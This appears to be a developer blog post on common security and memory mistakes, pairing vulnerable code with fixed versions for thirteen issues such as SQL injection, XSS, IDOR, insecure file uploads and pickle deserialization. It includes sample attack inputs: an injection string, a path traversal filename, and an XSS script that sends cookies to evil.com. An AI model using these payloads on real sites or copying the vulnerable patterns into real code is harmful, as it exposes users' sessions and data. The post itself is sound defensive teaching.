There's this quiet assumption in a lot of teams that security is someone else's problem. Maybe it's the one person with "security" in their job title. Maybe it's a quarterly audit. Maybe it's that Jira board you haven't looked at since onboarding. The problem is that by the time security becomes a meeting agenda item, the code that will cause the incident has already been written, reviewed, merged, and deployed. The code looked fine. It passed review. It worked. And it was still quietly wrong in a way that matters a lot when someone motivated decides to poke at it. This post isn't about policy. It's about the specific patterns developers write every single day that introduce vulnerabilities, memory leaks, and data exposure. Not because they're bad developers. Because nobody told them this was the thing to watch for.

Let's go through the list.

## Storing Secrets in the Codebase

This one feels obvious until you watch it happen in a real pull request from a competent engineer.

```python
# BAD: seen in actual production codebases, more than once
DB_PASSWORD = "hunter2_prod_2023"
API_KEY = "sk-live-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
STRIPE_SECRET = "sk_live_xxxxxxxxxxxxxxxxxxxxxxxx"
```

It usually starts as a "temporary" thing during local development. Then someone commits it "just to test something." Then it gets merged because the reviewer was focused on the logic, not the string on line 14. Then it lives in git history forever, because even if you remove it in the next commit, it's still in the log. GitHub's secret scanning catches some of it, but not custom tokens, internal service keys, or things that don't match known patterns.

```python
# GOOD: use environment variables and a secrets manager
import os
from some_secrets_sdk import get_secret

DB_PASSWORD = os.environ["DB_PASSWORD"]
API_KEY = get_secret("prod/api-key")
```

Use `.env` files locally, never commit them, and use a proper secrets manager in production (AWS Secrets Manager, HashiCorp Vault, Doppler, whatever fits your stack). Add your `.env` to `.gitignore` before you write a single line of real code in a project.

## SQL Injection via String Concatenation

This vulnerability is from 1998 and it is still being introduced today. Every week. Somewhere.

```python
# BAD: classic injection surface
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    return db.execute(query)

# An attacker passes: ' OR '1'='1
# Result: SELECT * FROM users WHERE username = '' OR '1'='1'
# Congratulations, you just returned every user in the database.
```

The fix is parameterized queries. Not sanitizing the input manually. Not escaping quotes. Parameterized queries.

```python
# GOOD: parameterized query, input never touches the query structure
def get_user(username):
    return db.execute("SELECT * FROM users WHERE username = ?", (username,))
```

ORMs help too, but using an ORM doesn't automatically make you immune. Raw query escape hatches in every major ORM (`.raw()`, `text()`, `execute()`) are injection surfaces if you concatenate user input into them. The rule is simple: never interpolate user-controlled data into a query string.

## Unvalidated and Untrusted Input Everywhere

This is broader than SQL injection. Any place your application accepts data from outside and acts on it without validation is a problem waiting to become an incident.

```javascript
// BAD: trusting the client to send the right user ID
app.post("/api/orders", async (req, res) => {
  const { userId, items } = req.body;
  // What if userId is someone else's ID?
  // What if items contains a negative quantity to get a refund?
  // What if items is a 50MB array?
  const order = await createOrder(userId, items);
  res.json(order);
});
```

Client-side validation is for user experience. Server-side validation is for security. They are not the same thing and one does not replace the other. Anyone with curl or Burp Suite can send whatever they want to your endpoint, bypassing every form validation you wrote.

```javascript
// GOOD: validate everything on the server, explicitly
import { z } from "zod";

const OrderSchema = z.object({
  items: z
    .array(
      z.object({
        productId: z.string().uuid(),
        quantity: z.number().int().min(1).max(100),
      }),
    )
    .min(1)
    .max(50),
});

app.post("/api/orders", authenticate, async (req, res) => {
  const userId = req.user.id; // from the verified auth token, not req.body
  const parsed = OrderSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json(parsed.error);
  const order = await createOrder(userId, parsed.data.items);
  res.json(order);
});
```

Note that `userId` comes from the authenticated session, not the request body. This is not a small detail.

## Broken Access Control

Authentication checks who you are. Authorization checks what you're allowed to do. Most apps do the first one and forget the second.

```javascript
// BAD: checks if you're logged in, not if this document belongs to you
app.get("/api/documents/:id", authenticate, async (req, res) => {
  const doc = await Document.findById(req.params.id);
  res.json(doc);
});
```

If your document IDs are sequential integers (another issue on its own), an authenticated user can just increment the ID and read everyone else's documents. This is called an Insecure Direct Object Reference (IDOR) and it's one of the most common vulnerabilities in web apps.

```javascript
// GOOD: verify ownership, not just authentication
app.get("/api/documents/:id", authenticate, async (req, res) => {
  const doc = await Document.findOne({
    _id: req.params.id,
    ownerId: req.user.id, // must belong to this user
  });
  if (!doc) return res.status(404).json({ error: "Not found" });
  res.json(doc);
});
```

Returning 404 instead of 403 is intentional. You don't want to confirm whether a resource exists to someone who shouldn't see it.

## Memory Leaks: Event Listeners That Never Get Removed

Memory leaks in JavaScript are usually not dramatic. The app doesn't crash immediately. It just gets slower over time until something falls over or a user complains.

```javascript
// BAD: adding a listener on every render with no cleanup
function Dashboard() {
  useEffect(() => {
    window.addEventListener("resize", handleResize);
    // no cleanup. this listener keeps stacking every time the component remounts.
  }, []);
}
```

Every time this component mounts and unmounts, a new listener gets added. On a single-page app where navigation is frequent, you can end up with dozens of the same listener active simultaneously, all running on every resize event, all holding references that prevent garbage collection.

```javascript
// GOOD: always return a cleanup function
function Dashboard() {
  useEffect(() => {
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);
}
```

The same pattern applies to WebSocket connections, intervals, timeouts, and subscriptions. If you open it, close it. If you subscribe, unsubscribe. Make the cleanup function the first thing you write after the setup.

## Memory Leaks: Forgetting to Close Database Connections

This one bites backend developers hard, especially early in a project when connection pooling hasn't been thought through.

```python
# BAD: connection opened, but what happens if an exception is thrown?
def save_record(data):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO records VALUES (?)", (data,))
    conn.commit()
    conn.close()  # never reached if execute() throws
```

If `cursor.execute()` raises an exception, `conn.close()` is never called. Do this enough times and you exhaust your connection pool, which means your entire application starts hanging on database calls.

```python
# GOOD: use context managers so cleanup is guaranteed
def save_record(data):
    with get_db_connection() as conn:
        conn.execute("INSERT INTO records VALUES (?)", (data,))
        conn.commit()
    # connection is always closed here, exception or not
```

In languages without context managers, use try/finally blocks. The pattern is the same: resource cleanup should be unconditional, not dependent on the happy path completing successfully.

## Cross-Site Scripting (XSS) via Unescaped Output

Rendering user-provided content directly into HTML is how you let strangers execute JavaScript in your users' browsers.

```javascript
// BAD: directly inserting user content into the DOM
function renderComment(comment) {
  document.getElementById("comments").innerHTML += comment.text;
}

// If comment.text is: <script>fetch('https://evil.com/?c='+document.cookie)</script>
// Every visitor who loads that page sends their session cookie to an attacker.
```

Modern frameworks mostly protect you from this by default (React escapes output, Vue does too), but there are escape hatches that developers use without thinking about the consequences.

```jsx
// BAD in React: dangerouslySetInnerHTML without sanitization
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// GOOD: use a sanitization library if you genuinely need HTML rendering
import DOMPurify from "dompurify";

function Comment({ text }) {
  const clean = DOMPurify.sanitize(text);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// BETTER: just don't use dangerouslySetInnerHTML unless you absolutely need it
function Comment({ text }) {
  return <div>{text}</div>; // React escapes this automatically
}
```

The name `dangerouslySetInnerHTML` is not subtle. It's a hint. Read the hint.

## Insecure Password Storage

Storing passwords in plain text is bad. Storing them with MD5 or SHA-1 is almost equally bad. These hash algorithms are not designed for passwords and can be cracked at billions of hashes per second with modern GPU hardware.

```python
# BAD: using a fast hash. MD5 and SHA-1 are especially bad.
import hashlib

def store_password(password):
    hashed = hashlib.md5(password.encode()).hexdigest()
    db.save(hashed)

# BAD: SHA-256 is better than MD5 but still not appropriate for passwords
hashed = hashlib.sha256(password.encode()).hexdigest()
```

Password hashing requires algorithms specifically designed to be slow and resistant to GPU acceleration: bcrypt, scrypt, or Argon2. These algorithms are intentionally expensive to compute, which means an attacker who gets your database can't just throw a GPU at it and crack everything in a day.

```python
# GOOD: use bcrypt or Argon2
import bcrypt

def store_password(password):
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(password.encode(), salt)
    db.save(hashed)

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)
```

The `rounds` parameter is the work factor. Higher means slower to compute, which is good for defense. 12 is a reasonable default in 2026, but you should adjust it based on your hardware so that checking a password takes roughly 100-300ms.

## Verbose Error Messages in Production

Developer-friendly error messages are attacker-friendly too.

```javascript
// BAD: leaking stack traces, database names, and file paths to the client
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    query: err.sql, // leaks your table structure
    path: err.filename, // leaks your server's file system layout
  });
});
```

Stack traces tell an attacker what framework you're using, what version, what your file structure looks like, and sometimes which database queries failed. That's reconnaissance handed to them for free.

```javascript
// GOOD: log the details server-side, return a generic message to the client
app.use((err, req, res, next) => {
  logger.error({
    message: err.message,
    stack: err.stack,
    requestId: req.id,
  });

  res.status(500).json({
    error: "Something went wrong.",
    requestId: req.id, // lets users report it, lets you look it up
  });
});
```

The request ID is a useful pattern: it's opaque to the attacker but gives you enough to correlate the error in your logs.

## Race Conditions in Concurrent Operations

Race conditions are security vulnerabilities when they involve anything related to permissions, payments, or state that shouldn't change mid-operation.

```javascript
// BAD: check-then-act with a gap in the middle
async function withdraw(userId, amount) {
  const user = await User.findById(userId);
  if (user.balance < amount) throw new Error("Insufficient funds");
  // gap here. if two requests come in simultaneously, both pass the check.
  await User.update(userId, { balance: user.balance - amount });
}
```

If two withdrawal requests arrive at the same millisecond, both pass the balance check, both proceed to deduct, and you've given out double the money. This is a real thing that has happened to real fintech companies.

```javascript
// GOOD: use atomic operations or database-level locking
async function withdraw(userId, amount) {
  const result = await db.transaction(async (trx) => {
    const user = await User.findById(userId).forUpdate().transacting(trx);
    if (user.balance < amount) throw new Error("Insufficient funds");
    await User.update(userId, { balance: user.balance - amount }).transacting(
      trx,
    );
    return user.balance - amount;
  });
  return result;
}
```

The `forUpdate()` lock prevents another transaction from reading and modifying this row until the current transaction completes. It's a small addition that prevents a class of bugs that are embarrassing and expensive to explain to users.

## Unchecked File Uploads

Accepting file uploads without validation is a classic way to let attackers upload executable code to your server.

```python
# BAD: accepting whatever the client sends
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    file.save(f"/uploads/{file.filename}")
    return "Uploaded"
```

Problems with this specific snippet: the filename comes from the client (path traversal attack: `../../etc/cron.d/evil`), there's no file type validation (an attacker can upload a `.php` or `.py` file), and there's no size limit (upload a 10GB file and watch your disk fill up).

```python
# GOOD: validate type, sanitize filename, enforce size limit, store outside web root
import os
import uuid
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "pdf"}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("file")
    if not file:
        return "No file", 400

    ext = file.filename.rsplit(".", 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return "File type not allowed", 400

    file.seek(0, 2)
    if file.tell() > MAX_FILE_SIZE:
        return "File too large", 400
    file.seek(0)

    # generate a random name. never trust the client's filename.
    safe_name = f"{uuid.uuid4()}.{ext}"
    file.save(os.path.join("/secure/storage/outside/webroot", safe_name))

    return {"filename": safe_name}
```

Better still: use a cloud storage service (S3, GCS) and validate the MIME type server-side by reading the file's magic bytes, not trusting the `Content-Type` header the client sends.

## Missing Rate Limiting

An endpoint with no rate limiting is an open invitation to brute-force attacks, credential stuffing, and denial of service.

```javascript
// BAD: no rate limiting on login. attacker can try millions of passwords.
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ token: generateToken(user) });
});
```

```javascript
// GOOD: rate limit by IP, and separately by account to prevent targeted attacks
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 attempts per IP per window
  message: "Too many login attempts. Try again later.",
  standardHeaders: true,
});

app.post("/api/login", loginLimiter, async (req, res) => {
  // ...
});
```

Apply rate limiting to anything that involves authentication, password reset, OTP verification, or any endpoint that accepts sensitive input. Also add CAPTCHA or proof-of-work on high-value endpoints if brute force is a serious concern for your threat model.

## Deserializing Untrusted Data

Deserializing data from untrusted sources without validation is a vector for remote code execution in several languages, and it's subtle enough that even experienced developers miss it.

```python
# BAD: pickle deserializes arbitrary Python objects, including malicious ones
import pickle

def load_session(session_data):
    return pickle.loads(session_data)  # session_data comes from a cookie
```

If an attacker can modify the cookie and understands pickle's format, they can craft a payload that executes arbitrary code when deserialized. This is not theoretical.

```python
# GOOD: use safe formats for data exchange, validate structure explicitly
import json
from schema_validator import validate  # or pydantic, marshmallow, etc.

def load_session(session_data):
    data = json.loads(session_data)  # JSON doesn't execute code
    return validate(SessionSchema, data)
```

In languages like Java, PHP, and Ruby, insecure deserialization is a well-known vulnerability class. The fix is consistent: use data formats (JSON, Protobuf, MessagePack) that don't execute code during deserialization, and validate the structure of whatever you parse before acting on it.

## Logging Sensitive Data

Logs are often less protected than your database. They go to aggregation services, get shared with third-party tools, sit in S3 buckets with broad access policies, and get exported in incident reports. Logging sensitive data is a privacy incident waiting to be discovered.

```javascript
// BAD: logging request bodies that contain sensitive fields
app.use((req, res, next) => {
  logger.info("Incoming request", {
    method: req.method,
    path: req.path,
    body: req.body, // this might include passwords, credit card numbers, SSNs
    headers: req.headers, // Authorization header, API keys
  });
  next();
});
```

```javascript
// GOOD: explicitly allowlist what gets logged, redact the rest
const SENSITIVE_FIELDS = new Set([
  "password",
  "token",
  "cardNumber",
  "ssn",
  "cvv",
]);

function redact(obj) {
  return Object.fromEntries(
    Object.entries(obj).map(([k, v]) => [
      k,
      SENSITIVE_FIELDS.has(k) ? "[REDACTED]" : v,
    ]),
  );
}

app.use((req, res, next) => {
  logger.info("Incoming request", {
    method: req.method,
    path: req.path,
    body: redact(req.body),
  });
  next();
});
```

Also redact from URL parameters. Passwords and tokens showing up in access logs because someone built a GET-based auth flow is an embarrassingly common source of credential exposure.

## The Broader Pattern

Looking at this list, there's a common thread running through all of it. The problem isn't that developers are careless. The problem is that the insecure version of the code is usually the shorter, simpler version. Concatenating a string is easier than learning parameterized queries. Removing the cleanup function from a useEffect saves four lines. Logging the whole request body takes one line instead of a redaction utility.

Security is the version of the code that does the extra work. That extra work needs to be habitual, which means it needs to be practiced at the individual developer level, not delegated upward to a security team that reviews things after the fact. A security team reviewing a PR can flag issues. But they can't build the habit of writing secure code into the developer who wrote the PR. That part takes time, attention, and a team culture where security is part of the definition of "done."

The good news is that most of these patterns are learnable, and once you've burned yourself (or watched someone else burn) on a SQL injection or a memory leak or a credential in git history, you don't forget it. The even better news is that you don't have to wait for the burn. The patterns are here. The fixes are not complicated. Just start writing the longer version of the code.
